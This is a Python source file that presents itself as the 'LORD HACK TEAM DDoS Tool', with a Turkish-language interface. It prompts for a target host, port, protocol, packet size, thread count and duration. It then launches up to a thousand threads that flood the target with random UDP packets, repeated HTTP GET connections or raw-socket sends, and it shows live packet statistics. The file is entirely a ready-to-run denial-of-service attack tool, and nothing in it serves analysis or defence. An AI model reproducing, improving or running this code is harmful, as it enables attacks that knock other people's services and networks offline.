import random
import socket
import threading
import time
import sys
import os
import signal

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

running = True
total_packets = 0
successful_packets = 0
failed_packets = 0
start_time = 0

def show_banner():
    banner = f"""{Colors.RED}
╔══════════════════════════════════════════════════════╗
║                                                      ║
║                   LORD HACK TEAM                     ║
║                                                      ║
║      CODER: NESAS_0DAY           ║
║                                                      ║
╚══════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(banner)

def create_packet(packet_type, size=1024, host=None):
    if packet_type == 'UDP':
        return os.urandom(size)
    elif packet_type == 'TCP':
        return f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
    elif packet_type == 'SYN':
        return bytes([random.randint(0, 255) for _ in range(40)])
    else:
        return os.urandom(size)

def send_packet(target_ip, target_port, packet_type, packet_size, timeout=1):
    global total_packets, successful_packets, failed_packets

    try:
        if packet_type == 'UDP':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif packet_type == 'TCP':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
        elif packet_type == 'SYN':
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        packet = create_packet(packet_type, packet_size, target_ip)

        if packet_type == 'TCP':
            sock.connect((target_ip, target_port))
            sock.send(packet)
        else:
            sock.sendto(packet, (target_ip, target_port))

        successful_packets += 1
        total_packets += 1
        sock.close()
    except:
        failed_packets += 1
        total_packets += 1

def attack_thread(target_ip, target_port, packet_type, packet_size, thread_id):
    while running:
        send_packet(target_ip, target_port, packet_type, packet_size)

def show_stats():
    while running:
        elapsed = time.time() - start_time
        packets_per_sec = total_packets / elapsed if elapsed > 0 else 0
        success_rate = (successful_packets / total_packets) * 100 if total_packets > 0 else 0

        sys.stdout.write(
            f"\r{Colors.BLUE}Paketler: {total_packets} | "
            f"Başarılı: {successful_packets} | "
            f"Başarısız: {failed_packets} | "
            f"Hız: {packets_per_sec:.1f}/s | "
            f"Başarı: {success_rate:.1f}%{Colors.RESET}"
        )
        sys.stdout.flush()
        time.sleep(0.5)

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.RED}\nSaldırı durduruluyor...{Colors.RESET}")
    running = False
    sys.exit(0)

def main():
    global start_time, running

    signal.signal(signal.SIGINT, signal_handler)

    show_banner()
    print(f"{Colors.YELLOW}=== LORD HACK TEAM DDoS Tool ==={Colors.RESET}")

    target_ip = input("Hedef IP/URL: ").strip()
    if 'http://' in target_ip:
        target_ip = target_ip.split('http://')[1]
    if 'https://' in target_ip:
        target_ip = target_ip.split('https://')[1]
    if '/' in target_ip:
        target_ip = target_ip.split('/')[0]

    try:
        target_ip = socket.gethostbyname(target_ip)
    except:
        print(f"{Colors.RED}Hedef çözümlenemedi!{Colors.RESET}")
        return

    try:
        target_port = int(input("Hedef Port (varsayılan 80): ") or 80)
        packet_type = input("Paket Tipi (UDP/TCP/SYN, varsayılan UDP): ").upper() or 'UDP'
        packet_size = int(input("Paket Boyutu (bayt, varsayılan 1024): ") or 1024)
        thread_count = int(input("Thread Sayısı (varsayılan 1000): ") or 1000)
        duration = int(input("Süre (saniye, 0=sonsuz): ") or 0)
    except ValueError:
        print(f"{Colors.RED}Geçersiz giriş! Lütfen sayısal değer girin.{Colors.RESET}")
        return

    print(f"\n{Colors.RED}Hedef: {target_ip}:{target_port}")
    print(f"Protokol: {packet_type}")
    print(f"Thread: {thread_count}")
    print(f"Süre: {'sonsuz' if duration == 0 else f'{duration} saniye'}{Colors.RESET}")

    input(f"\n{Colors.YELLOW}Başlatmak için ENTER'a basın...{Colors.RESET}")

    start_time = time.time()

    threading.Thread(target=show_stats, daemon=True).start()

    threads = []
    for i in range(thread_count):
        try:
            t = threading.Thread(
                target=attack_thread,
                args=(target_ip, target_port, packet_type, packet_size, i),
                daemon=True
            )
            t.start()
            threads.append(t)
        except:
            continue

    if duration > 0:
        time.sleep(duration)
        running = False
    else:
        while running:
            time.sleep(1)

    running = False
    for t in threads:
        t.join(timeout=0.1)

    elapsed = time.time() - start_time
    packets_per_sec = total_packets / elapsed if elapsed > 0 else 0

    print(f"\n\n{Colors.GREEN}Saldırı tamamlandı!")
    print(f"Toplam Paket: {total_packets}")
    print(f"Paket Hızı: {packets_per_sec:.1f}/s")
    print(f"Süre: {elapsed:.1f} saniye{Colors.RESET}")

if __name__ == "__main__":
    main()